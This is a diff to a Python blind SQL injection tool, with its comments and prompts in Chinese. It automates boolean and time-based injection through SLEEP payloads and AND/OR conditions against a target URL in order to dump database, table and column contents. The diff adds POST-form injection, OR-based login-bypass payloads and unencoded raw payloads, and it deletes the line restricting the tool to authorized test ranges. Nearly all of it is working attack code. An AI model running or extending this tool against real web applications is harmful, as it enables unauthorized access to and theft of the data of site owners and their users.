@@ -7,8 +7,6 @@ SQL 盲注辅助脚本，支持布尔盲注和时间盲注。
 2. 爆出所有数据库的表名，或指定数据库的表名。
 3. 爆出所有已列出表的字段名，或指定表的字段名。
 4. 爆出指定表的指定字段内容。
-
-仅用于你拥有授权的靶场或测试环境。
 """
 
 from __future__ import annotations
@@ -19,7 +17,7 @@ import time
 from dataclasses import dataclass
 from difflib import SequenceMatcher
 from typing import Optional
-from urllib.parse import quote
+from urllib.parse import parse_qsl, quote, urlencode
 
 import requests
 
@@ -47,6 +45,10 @@ DEFAULT_SUFFIX_CANDIDATES = [
     "/*",
     "",
 ]
+DEFAULT_OPERATOR_CANDIDATES = [
+    "AND",
+    "OR",
+]
 
 
 @dataclass
@@ -66,6 +68,7 @@ class BlindSQLi:
         base_url: str,
         injection_marker: str,
         technique: str,
+        operator: Optional[str],
         prefix: Optional[str],
         suffix: Optional[str],
         marker: str,
@@ -75,10 +78,22 @@ class BlindSQLi:
         verbose: bool,
         sleep_time: float,
         time_threshold: float,
+        request_method: str,
+        post_data: Optional[str],
+        post_param: Optional[str],
+        content_type: str,
+        raw_payload: bool,
     ) -> None:
         self.base_url = base_url
         self.injection_marker = injection_marker
         self.technique = technique
+        self.request_method = request_method.upper()
+        self.post_data = post_data
+        self.post_param = post_param
+        self.content_type = content_type
+        self.raw_payload = raw_payload
+        self.operator_candidates = [operator.upper()] if operator is not None else DEFAULT_OPERATOR_CANDIDATES
+        self.operator = self.operator_candidates[0]
         self.prefix_candidates = [prefix] if prefix is not None else DEFAULT_PREFIX_CANDIDATES
         self.suffix_candidates = [suffix] if suffix is not None else DEFAULT_SUFFIX_CANDIDATES
         self.prefix = self.prefix_candidates[0]
@@ -105,36 +120,76 @@ class BlindSQLi:
             return f"IF(({condition}),SLEEP({self.sleep_time}),0)"
         return f"({condition})"
 
-    def _build_payload(self, prefix: str, suffix: str, condition: str) -> str:
-        payload = f"{prefix} AND {self._condition_expr(condition)}"
+    def _build_payload(self, prefix: str, operator: str, suffix: str, condition: str) -> str:
+        payload = f"{prefix} {operator} {self._condition_expr(condition)}"
         if suffix:
             payload += suffix
         return payload
 
     def _payload_for(self, condition: str) -> str:
-        return self._build_payload(self.prefix, self.suffix, condition)
+        return self._build_payload(self.prefix, self.operator, self.suffix, condition)
+
+    def _payload_value(self, payload: str) -> str:
+        if self.raw_payload:
+            return payload
+        return quote(payload, safe="")
 
     def _url_for(self, payload: str) -> str:
-        encoded_payload = quote(payload, safe="")
+        encoded_payload = self._payload_value(payload)
         if self.injection_marker and self.injection_marker in self.base_url:
             return self.base_url.replace(self.injection_marker, encoded_payload)
         return self.base_url + encoded_payload
 
+    def _post_body_for(self, payload: str) -> str:
+        if not self.post_data:
+            raise RuntimeError("POST mode requires --data or manual POST body input.")
+        if self.injection_marker in self.post_data:
+            return self.post_data.replace(self.injection_marker, self._payload_value(payload))
+
+        if self.post_param:
+            pairs = parse_qsl(self.post_data, keep_blank_values=True)
+            replaced = False
+            for index, (name, value) in enumerate(pairs):
+                if name == self.post_param:
+                    pairs[index] = (name, payload if self.raw_payload else payload)
+                    replaced = True
+            if replaced:
+                return urlencode(pairs)
+            raise RuntimeError(f"POST parameter {self.post_param!r} was not found in POST body.")
+
+        raise RuntimeError(
+            f"POST body must contain injection marker {self.injection_marker!r} "
+            "or --post-param must name the injectable parameter."
+        )
+
     def _request(self, payload: str) -> tuple[str, float]:
-        url = self._url_for(payload)
+        url = self._url_for(payload) if self.request_method == "GET" else self.base_url
         if self.verbose:
-            print(f"[REQ] {url}", file=sys.stderr)
+            print(f"[REQ] {self.request_method} {url}", file=sys.stderr)
 
         last_error: Optional[Exception] = None
         for attempt in range(3):
             try:
                 start = time.perf_counter()
-                response = self.session.get(
-                    url,
-                    timeout=self.timeout,
-                    proxies=self.proxies,
-                    allow_redirects=True,
-                )
+                if self.request_method == "POST":
+                    body = self._post_body_for(payload)
+                    if self.verbose:
+                        print(f"[BODY] {body}", file=sys.stderr)
+                    response = self.session.post(
+                        url,
+                        data=body,
+                        headers={"Content-Type": self.content_type},
+                        timeout=self.timeout,
+                        proxies=self.proxies,
+                        allow_redirects=True,
+                    )
+                else:
+                    response = self.session.get(
+                        url,
+                        timeout=self.timeout,
+                        proxies=self.proxies,
+                        allow_redirects=True,
+                    )
                 elapsed = time.perf_counter() - start
                 self.request_count += 1
                 if self.delay:
@@ -159,37 +214,40 @@ class BlindSQLi:
     def _calibrate_boolean(self) -> None:
         tested = []
         for prefix in self.prefix_candidates:
-            for suffix in self.suffix_candidates:
-                tested.append(f"prefix={prefix!r}, suffix={suffix!r}")
-                true_body = self._get(self._build_payload(prefix, suffix, "1=1"))
-                false_body = self._get(self._build_payload(prefix, suffix, "1=2"))
+            for operator in self.operator_candidates:
+                for suffix in self.suffix_candidates:
+                    tested.append(f"prefix={prefix!r}, operator={operator!r}, suffix={suffix!r}")
+                    true_body = self._get(self._build_payload(prefix, operator, suffix, "1=1"))
+                    false_body = self._get(self._build_payload(prefix, operator, suffix, "1=2"))
 
-                if true_body == false_body:
-                    continue
+                    if true_body == false_body:
+                        continue
 
-                marker = None
-                if self.preferred_marker:
-                    true_has = self.preferred_marker in true_body
-                    false_has = self.preferred_marker in false_body
-                    if true_has and not false_has:
-                        marker = self.preferred_marker
+                    marker = None
+                    if self.preferred_marker:
+                        true_has = self.preferred_marker in true_body
+                        false_has = self.preferred_marker in false_body
+                        if true_has and not false_has:
+                            marker = self.preferred_marker
 
-                self.prefix = prefix
-                self.suffix = suffix
-                self.calibration = Calibration(
-                    true_body=true_body,
-                    false_body=false_body,
-                    true_len=len(true_body),
-                    false_len=len(false_body),
-                    marker=marker,
-                )
+                    self.prefix = prefix
+                    self.operator = operator
+                    self.suffix = suffix
+                    self.calibration = Calibration(
+                        true_body=true_body,
+                        false_body=false_body,
+                        true_len=len(true_body),
+                        false_len=len(false_body),
+                        marker=marker,
+                    )
 
-                mode = f"marker={marker!r}" if marker else "response similarity"
-                print(
-                    f"[*] 布尔盲注校准成功: prefix={prefix!r}, suffix={suffix!r}, "
-                    f"true_len={len(true_body)}, false_len={len(false_body)}, oracle={mode}"
-                )
-                return
+                    mode = f"marker={marker!r}" if marker else "response similarity"
+                    print(
+                        f"[*] 布尔盲注校准成功: prefix={prefix!r}, operator={operator!r}, "
+                        f"suffix={suffix!r}, true_len={len(true_body)}, "
+                        f"false_len={len(false_body)}, oracle={mode}"
+                    )
+                    return
 
         raise RuntimeError(
             "所有闭合模板的 true/false 响应都相同。请检查 URL、闭合方式、注释符或 true marker。"
@@ -200,31 +258,33 @@ class BlindSQLi:
     def _calibrate_time(self) -> None:
         tested = []
         for prefix in self.prefix_candidates:
-            for suffix in self.suffix_candidates:
-                tested.append(f"prefix={prefix!r}, suffix={suffix!r}")
-                _false_body, false_elapsed = self._request(
-                    self._build_payload(prefix, suffix, "1=2")
-                )
-                _true_body, true_elapsed = self._request(
-                    self._build_payload(prefix, suffix, "1=1")
-                )
-                delta = true_elapsed - false_elapsed
+            for operator in self.operator_candidates:
+                for suffix in self.suffix_candidates:
+                    tested.append(f"prefix={prefix!r}, operator={operator!r}, suffix={suffix!r}")
+                    _false_body, false_elapsed = self._request(
+                        self._build_payload(prefix, operator, suffix, "1=2")
+                    )
+                    _true_body, true_elapsed = self._request(
+                        self._build_payload(prefix, operator, suffix, "1=1")
+                    )
+                    delta = true_elapsed - false_elapsed
 
-                if delta < self.time_threshold:
-                    continue
+                    if delta < self.time_threshold:
+                        continue
 
-                self.prefix = prefix
-                self.suffix = suffix
-                self.calibration = Calibration(
-                    false_elapsed=false_elapsed,
-                    true_elapsed=true_elapsed,
-                )
-                print(
-                    f"[*] 时间盲注校准成功: prefix={prefix!r}, suffix={suffix!r}, "
-                    f"false={false_elapsed:.2f}s, true={true_elapsed:.2f}s, "
-                    f"threshold={self.time_threshold:.2f}s"
-                )
-                return
+                    self.prefix = prefix
+                    self.operator = operator
+                    self.suffix = suffix
+                    self.calibration = Calibration(
+                        false_elapsed=false_elapsed,
+                        true_elapsed=true_elapsed,
+                    )
+                    print(
+                        f"[*] 时间盲注校准成功: prefix={prefix!r}, operator={operator!r}, "
+                        f"suffix={suffix!r}, false={false_elapsed:.2f}s, "
+                        f"true={true_elapsed:.2f}s, threshold={self.time_threshold:.2f}s"
+                    )
+                    return
 
         raise RuntimeError(
             "所有闭合模板都没有产生稳定延迟。请检查 URL、闭合方式、注释符、"
@@ -358,6 +418,25 @@ def print_numbered(title: str, items: list[str]) -> None:
 
     for index, item in enumerate(items, start=1):
         print(f"{index}. {item}")
+
+
+def strip_wrapping_quotes(value: str) -> str:
+    value = value.strip()
+    wrappers = [
+        ("“", "”"),
+        ("”", "“"),
+        ('"', '"'),
+        ("'", "'"),
+    ]
+    changed = True
+    while changed and len(value) >= 2:
+        changed = False
+        for left, right in wrappers:
+            if value.startswith(left) and value.endswith(right):
+                value = value[1:-1].strip()
+                changed = True
+                break
+    return value
 
 
 def choose_menu(prompt: str, options: list[str]) -> int:
@@ -641,6 +720,20 @@ def choose_technique(args: argparse.Namespace) -> str:
     return "boolean" if mode == 1 else "time"
 
 
+def choose_request_method(args: argparse.Namespace) -> str:
+    if args.method:
+        return args.method.upper()
+
+    mode = choose_menu(
+        "请选择请求方式",
+        [
+            "GET 型注入",
+            "POST 型注入",
+        ],
+    )
+    return "GET" if mode == 1 else "POST"
+
+
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="SQL 盲注辅助脚本，支持布尔盲注和时间盲注。")
     parser.add_argument(
@@ -652,6 +745,32 @@ def parse_args() -> argparse.Namespace:
         ),
     )
     parser.add_argument("--ask-url", action="store_true", help="启动后手动输入目标 URL。")
+    parser.add_argument(
+        "--method",
+        choices=["GET", "POST", "get", "post"],
+        default=None,
+        help="请求方式。不传则启动后手动选择。",
+    )
+    parser.add_argument(
+        "--data",
+        default=None,
+        help="POST 请求体。推荐包含 {inj}，也可以配合 --post-param 指定注入参数。",
+    )
+    parser.add_argument(
+        "--post-param",
+        default=None,
+        help="POST 表单中要注入的参数名，例如 uname。用于 --data 中没有 {inj} 的情况。",
+    )
+    parser.add_argument(
+        "--content-type",
+        default="application/x-www-form-urlencoded",
+        help="POST 请求的 Content-Type。",
+    )
+    parser.add_argument(
+        "--raw-payload",
+        action="store_true",
+        help="不对 payload 做 URL 编码，直接替换到 URL 或 POST body 的 {inj}。",
+    )
     parser.add_argument(
         "--technique",
         choices=["boolean", "time"],
@@ -667,6 +786,12 @@ def parse_args() -> argparse.Namespace:
         "--prefix",
         default=None,
         help="AND 条件之前的闭合前缀。不传则自动探测。",
+    )
+    parser.add_argument(
+        "--operator",
+        choices=["AND", "OR", "and", "or"],
+        default=None,
+        help="条件连接符。不传则自动探测 AND/OR，登录万能密码类通常需要 OR。",
     )
     parser.add_argument(
         "--suffix",
@@ -704,17 +829,39 @@ def parse_args() -> argparse.Namespace:
 def main() -> int:
     args = parse_args()
     args.technique = choose_technique(args)
+    args.method = choose_request_method(args)
     marker = args.marker if args.marker else ""
 
     if args.ask_url or not args.url:
-        # 支持直接把注入点放在 URL 末尾，也支持用 {inj} 精确指定注入位置。
+        # GET 可以在 URL 末尾追加 payload，POST 的 URL 只需要填接口地址。
         custom_url = input(
-            "请输入靶场 URL 注入点（可以用 {inj} 精确指定注入位置）: "
+            "请输入目标 URL（GET 可用 {inj} 指定注入点，POST 填接口地址）: "
         ).strip()
-        args.url = custom_url
+        args.url = strip_wrapping_quotes(custom_url)
+    elif args.url:
+        args.url = strip_wrapping_quotes(args.url)
 
     if not args.url:
         print("未输入目标 URL，脚本停止。", file=sys.stderr)
+        return 2
+
+    if args.method == "POST" and not args.data:
+        args.data = input(
+            "请输入 POST 请求体，例如 passwd=2&submit=Submit&uname={inj}: "
+        ).strip()
+
+    if args.method == "POST" and args.data:
+        args.data = strip_wrapping_quotes(args.data)
+
+    if args.method == "POST" and args.data and args.injection_marker not in args.data and not args.post_param:
+        args.post_param = input(
+            "POST 请求体中没有 {inj}，请输入要注入的参数名，例如 uname: "
+        ).strip()
+
+    if args.method == "POST" and (
+        not args.data or (args.injection_marker not in args.data and not args.post_param)
+    ):
+        print(f"POST 请求体必须包含注入点 {args.injection_marker}，或指定 --post-param。", file=sys.stderr)
         return 2
 
     if args.char_min < 0 or args.char_max > 255 or args.char_min > args.char_max:
@@ -737,6 +884,7 @@ def main() -> int:
         base_url=args.url,
         injection_marker=args.injection_marker,
         technique=args.technique,
+        operator=args.operator,
         prefix=args.prefix,
         suffix=args.suffix,
         marker=marker,
@@ -746,6 +894,11 @@ def main() -> int:
         verbose=args.verbose,
         sleep_time=args.sleep_time,
         time_threshold=args.time_threshold,
+        request_method=args.method,
+        post_data=args.data,
+        post_param=args.post_param,
+        content_type=args.content_type,
+        raw_payload=args.raw_payload,
     )
 
     try:
